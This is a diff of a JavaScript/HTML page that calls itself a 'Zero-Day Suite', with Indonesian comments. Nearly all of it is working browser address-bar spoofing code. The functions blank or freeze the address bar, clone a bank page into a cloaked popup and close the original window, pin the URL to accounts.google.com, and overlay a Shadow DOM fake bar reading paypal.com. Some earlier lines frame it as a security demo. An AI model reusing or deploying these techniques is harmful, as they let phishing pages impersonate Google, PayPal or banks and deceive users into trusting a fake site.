-    // EXPLOIT 3: WINDOW CLOAKING + BLANK BAR
-    // Membuka popup yang address barnya kosong, isinya clone halaman bank
+    // EXTENDED: Ghost Navigation (Blank Address Bar)
     // ============================================================
-    function windowCloaking() {
-        cleanup();
-        
-        updateStatus("[CLOAK] Membuka cloaked window dengan blank address bar...", true);
+    function exploitGhostNavigation() {
+        updateCardStatus('status-ext1', 'Ghost navigation...', true);
         
         const currentHTML = document.documentElement.outerHTML;
+        const newWin = window.open('about:blank', '_self');
         
-        // Buat window dengan ukuran yang sama persis
-        const features = `width=${window.innerWidth},height=${window.innerHeight},top=0,left=0,toolbar=no,location=yes,menubar=no,status=no`;
+        if (newWin) {
+            newWin.document.write(currentHTML);
+            newWin.document.close();
+            
+            setTimeout(() => {
+                newWin.history.replaceState({}, '', ' ');
+                const interval = setInterval(() => {
+                    if (newWin.location.href !== ' ' && newWin.location.href !== '') {
+                        newWin.history.replaceState({}, '', ' ');
+                    }
+                }, 50);
+                activeIntervals.push(interval);
+                
+                updateCardStatus('status-ext1', 'ACTIVE: Address bar KOSONG TOTAL!', true);
+                showToast('EXT-001: Address bar blank — bukan about:blank', false);
+            }, 100);
+        }
+    }
+
+    function exploitDataURLBlank() {
+        updateCardStatus('status-ext1', 'Data URL blank...', true);
         
-        const popup = window.open("about:blank", "_blank", features);
+        const currentHTML = document.documentElement.outerHTML;
+        const encoded = 'data:text/html;charset=utf-8,' + encodeURIComponent(currentHTML);
+        location.href = encoded;
+        
+        setTimeout(() => {
+            history.replaceState({}, '', ' ');
+            updateCardStatus('status-ext1', 'ACTIVE: Data URL → blank address bar', true);
+        }, 100);
+    }
+
+    function exploitWindowCloaking() {
+        updateCardStatus('status-ext1', 'Window cloaking...', true);
+        
+        const currentHTML = document.documentElement.outerHTML;
+        const features = `width=${window.innerWidth},height=${window.innerHeight},top=0,left=0`;
+        const popup = window.open('about:blank', '_blank', features);
         
         if (popup) {
+            activeWindows.push(popup);
             popup.document.write(currentHTML);
             popup.document.close();
             
             setTimeout(() => {
-                try {
-                    // Kosongkan address bar di popup
-                    popup.history.replaceState({}, "", " ");
-                    popup.history.pushState({}, "", " ");
-                    
-                    // Lock
-                    const popupInterval = setInterval(() => {
-                        if (popup.location.href !== " " && popup.location.href !== "") {
-                            popup.history.replaceState({}, "", " ");
-                        }
-                    }, 50);
-                    
-                    // Tutup window asli setelah 500ms (optional - buat benar-benar cloaking)
-                    setTimeout(() => {
-                        window.close();
-                    }, 500);
-                    
-                    updateStatus("[SUCCESS] Cloaked window terbuka dengan address bar kosong! Window asli tertutup.", true);
-                    showToast("🪟 New window with EMPTY address bar — looks like system dialog", false);
-                    
-                } catch(e) {
-                    updateStatus(`[ERROR] ${e.message}`, false);
-                }
+                popup.history.replaceState({}, '', ' ');
+                window.close();
+                updateCardStatus('status-ext1', 'ACTIVE: Cloaked window + blank address bar', true);
             }, 100);
-        } else {
-            updateStatus("[BLOCKED] Popup diblokir browser. Izinkan popup terlebih dahulu.", false);
         }
     }
-    
+
     // ============================================================
-    // EXPLOIT 4: HISTORY DEEP FREEZE
-    // Membekukan history stack sehingga back/forward tidak bisa mengubah URL
+    // EXTENDED: History Deep Freeze
     // ============================================================
-    function historyDeepFreeze() {
-        cleanup();
+    function exploitHistoryFreeze() {
+        updateCardStatus('status-ext2', 'History freeze...', true);
         
-        updateStatus("[FREEZE] Membekukan history stack...", true);
+        const targetUrl = 'https://accounts.google.com';
         
-        const targetUrl = "https://accounts.google.com";
-        
-        // Technique 1: Override pushState dan replaceState
+        // Override pushState
         window.history.pushState = function(state, title, url) {
-            console.log("[FREEZE] Blocked pushState to:", url);
             return originalPushState.call(this, state, title, targetUrl);
         };
         
         window.history.replaceState = function(state, title, url) {
-            console.log("[FREEZE] Blocked replaceState to:", url);
             return originalReplaceState.call(this, state, title, targetUrl);
         };
         
-        // Technique 2: Lock current URL
-        history.pushState({}, "", targetUrl);
+        history.pushState({}, '', targetUrl);
         
-        // Technique 3: Interval super agresif
-        exploitInterval = setInterval(() => {
+        const interval = setInterval(() => {
             if (window.location.href !== targetUrl) {
-                try {
-                    history.replaceState({}, "", targetUrl);
-                } catch(e) {}
+                history.replaceState({}, '', targetUrl);
             }
-            // Juga cegah perubahan title
-            if (document.title !== "Google Accounts") {
-                document.title = "Google Accounts";
-            }
-        }, 10);
+        }, 30);
+        activeIntervals.push(interval);
         
-        // Technique 4: Intercept popstate
-        const popstateBlocker = (e) => {
+        // Block popstate
+        const blocker = (e) => {
             e.preventDefault();
-            history.pushState({}, "", targetUrl);
+            history.pushState({}, '', targetUrl);
         };
-        window.addEventListener('popstate', popstateBlocker);
+        window.addEventListener('popstate', blocker);
+        activeIntervals.push(() => window.removeEventListener('popstate', blocker));
         
-        isGhosting = true;
-        activeExploit = { popstateBlocker };
-        
-        updateStatus("[SUCCESS] History stack DEEP FROZEN! Back/forward tidak bisa mengubah URL.", true);
-        showToast("❄️ History frozen — address bar permanently shows google.com", false);
+        updateCardStatus('status-ext2', 'ACTIVE: History frozen! Back/forward tidak bisa ubah URL', true);
+        showToast('EXT-002: History stack frozen', false);
     }
-    
-    // Reset khusus yang lebih lengkap
-    function resetAll() {
-        cleanup();
+
+    function exploitPopstateBlock() {
+        updateCardStatus('status-ext2', 'Popstate block...', true);
         
-        // Restore original history functions
-        window.history.pushState = originalPushState;
-        window.history.replaceState = originalReplaceState;
+        history.pushState({}, '', 'https://www.google.com');
         
-        // Remove popstate blocker
-        if (activeExploit && activeExploit.popstateBlocker) {
-            window.removeEventListener('popstate', activeExploit.popstateBlocker);
-        }
+        window.addEventListener('popstate', (e) => {
+            e.preventDefault();
+            history.go(1);
+        });
         
-        // Remove shadow host
-        const shadowHost = document.getElementById('shadowSpoofHost');
+        updateCardStatus('status-ext2', 'ACTIVE: Popstate events blocked', true);
+    }
+
+    function exploitInfinitePush() {
+        updateCardStatus('status-ext2', 'Infinite push...', true);
+        
+        const interval = setInterval(() => {
+            history.pushState({}, '', `https://google.com/page${Math.random()}`);
+        }, 10);
+        activeIntervals.push(interval);
+        
+        updateCardStatus('status-ext2', 'ACTIVE: Infinite PushState — history infinite', true);
+    }
+
+    // ============================================================
+    // EXTENDED: Shadow DOM Spoof
+    // ============================================================
+    function exploitShadowDOM() {
+        updateCardStatus('status-ext3', 'Shadow DOM spoof...', true);
+        
+        // Remove existing if any
         if (shadowHost) shadowHost.remove();
         
-        // Reset document title
-        document.title = "Secure Bank - Online Banking";
+        shadowHost = document.createElement('div');
+        shadowHost.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; z-index: 2147483647;';
+        document.body.appendChild(shadowHost);
         
-        // Clean URL
-        try {
-            const cleanPath = window.location.pathname;
-            if (cleanPath && cleanPath !== '/') {
-                history.replaceState({}, '', cleanPath);
-            } else {
-                history.replaceState({}, '', '/');
+        const shadow = shadowHost.attachShadow({ mode: 'open' });
+        shadow.innerHTML = `
+            <style>
+                .fake-bar {
+                    background: #f5f5f7;
+                    padding: 12px;
+                    font-family: monospace;
+                    border-bottom: 1px solid #ddd;
+                    display: flex;
+                    gap: 12px;
+                }
+                .fake-url {
+                    flex: 1;
+                    background: white;
+                    padding: 8px;
+                    border-radius: 8px;
+                }
+            </style>
+            <div class="fake-bar">
+                <div>🔒</div>
+                <div class="fake-url">https://www.paypal.com</div>
+            </div>
+        `;
+        
+        // Also spoof real address bar
+        history.pushState({}, '', 'https://www.paypal.com');
+        const interval = setInterval(() => {
+            if (window.location.href !== 'https://www.paypal.com') {
+                history.replaceState({}, '', 'https://www.paypal.com');
             }
-        } catch(e) {}
+        }, 50);
+        activeIntervals.push(interval);
         
-        updateStatus("System reset. Address bar restored.", false);
-        showToast("✅ All exploits cleared. Browser back to normal.", false);
+        updateCardStatus('status-ext3', 'ACTIVE: Shadow DOM + real spoof active', true);
     }
-    
-    // ============================================================
-    // DRAG & DROP untuk panel (biar user bisa geser)
-    // ============================================================
-    let isDragging = false;
-    let dragOffsetX, dragOffsetY;
-    const panel = document.getElementById('phantomPanel');
-    const dragHandle = document.getElementById('panelDragHandle');
-    
-    dragHandle.addEventListener('mousedown', (e) => {
-        isDragging = true;
-        dragOffsetX = e.clientX - panel.offsetLeft;
-        dragOffsetY = e.clientY - panel.offsetTop;
-        panel.style.position = 'fixed';
-        panel.style.cursor = 'grabbing';
-    });
-    
-    document.addEventListener('mousemove', (e) => {
-        if (!isDragging) return;
-        panel.style.left = (e.clientX - dragOffsetX) + 'px';
-        panel.style.top = (e.clientY - dragOffsetY) + 'px';
-        panel.style.right = 'auto';
-        panel.style.bottom = 'auto';
-    });
-    
-    document.addEventListener('mouseup', () => {
-        isDragging = false;
-        panel.style.cursor = 'move';
-    });
-    
-    // ============================================================
-    // EVENT LISTENERS
-    // ============================================================
-    document.getElementById('ghostNavigation').addEventListener('click', ghostNavigation);
-    document.getElementById('shadowDOMAttack').addEventListener('click', shadowDOMAttack);
-    document.getElementById('windowCloaking').addEventListener('click', windowCloaking);
-    document.getElementById('historyDeepFreeze').addEventListener('click', historyDeepFreeze);
-    document.getElementById('resetAll').addEventListener('click', resetAll);
-    
-    // Fake bank buttons (just for show)
-    document.getElementById('transferBtn').addEventListener('click', () => {
-        showToast("💸 Transfer initiated — this is a demo", false);
-    });
-    document.getElementById('statementBtn').addEventListener('click', () => {
-        showToast("📄 Statement downloaded — demo only", false);
-    });
-    document.getElementById('logoutBtn').addEventListener('click', () => {
-        showToast("🔓 Logged out — thank you for using demo", false);
+
+    function exploitDoubleLayer() {
+        exploitShadowDOM();
         setTimeout(() => {
-            if (confirm("This was a security demonstration. The address bar may have been spoofed. Click OK to reset.")) {
-                resetAll();
-            }
+            exploitPushStateLock();
+            updateCardStatus('status-ext3', 'ACTIVE: Double layer spoof (Shadow + PushState)', true);
         }, 100);
-    });
-    
-    // Initial setup
-    updateStatus("Ready | Select an exploit from panel", false);
-    console.log("%c🔥 PHANTOM BAR v3.0 — Zero-Click Address Bar Ghosting Exploit", "color: #ff6b6b; font-size: 14px; font-weight: bold;");
-    console.log("Techniques: Ghost Navigation, Shadow DOM Spoof, Window Cloaking, History Deep Freeze");
-    console.log("100% original — inspired by real CVE bounties but with novel approach");
+    }
+
+    // ============================================================
+    // UTILITIES
+    // ============================================================
+    function showStatus() {
+        let msg = '';
+        if (activeIntervals.length > 0) msg += `${activeIntervals.length} active intervals. `;
+        if (activeWindows.length > 0) msg += `${activeWindows.length} windows open. `;
+        if (isFrozen) msg += 'History frozen. ';
+        msg += msg || 'No active exploits';
+        showToast(msg, false);
+    }
+
+    function runAllExploits() {
+        exploitMismatch();
+        setTimeout(() => exploitFullscreenToast(), 500);
+        setTimeout(() => exploitShadowDOM(), 1000);
+        setTimeout(() => exploitHistoryFreeze(), 1500);
+        showToast('Running multiple exploits simultaneously...', false);
+    }
+
+    // Export to global
+    window.resetAllExploits = resetAllExploits;
+    window.showStatus = showStatus;
+    window.runAllExploits = runAllExploits;
+    window.exploitBlankWindow = exploitBlankWindow;
+    window.exploitCustomWindowTitle = exploitCustomWindowTitle;
+    window.exploitMismatch = exploitMismatch;
+    window.exploitIframeScheme = exploitIframeScheme;
+    window.exploitPushStateLock = exploitPushStateLock;
+    window.exploitFullscreenToast = exploitFullscreenToast;
+    window.exploitFakeBrowserUI = exploitFakeBrowserUI;
+    window.exploitGhostNavigation = exploitGhostNavigation;
+    window.exploitDataURLBlank = exploitDataURLBlank;
+    window.exploitWindowCloaking = exploitWindowCloaking;
+    window.exploitHistoryFreeze = exploitHistoryFreeze;
+    window.exploitPopstateBlock = exploitPopstateBlock;
+    window.exploitInfinitePush = exploitInfinitePush;
+    window.exploitShadowDOM = exploitShadowDOM;
+    window.exploitDoubleLayer = exploitDoubleLayer;
+
+    console.log('%c🔥 ZERO-DAY SUITE v4.0 LOADED', 'color: #ff3b30; font-size: 16px;');
+    console.log('CVEs: CVE-2025-15032, CVE-2026-2378, CVE-2025-13132');
+    console.log('Total techniques: 15+');
 </script>
 </body>
 </html>
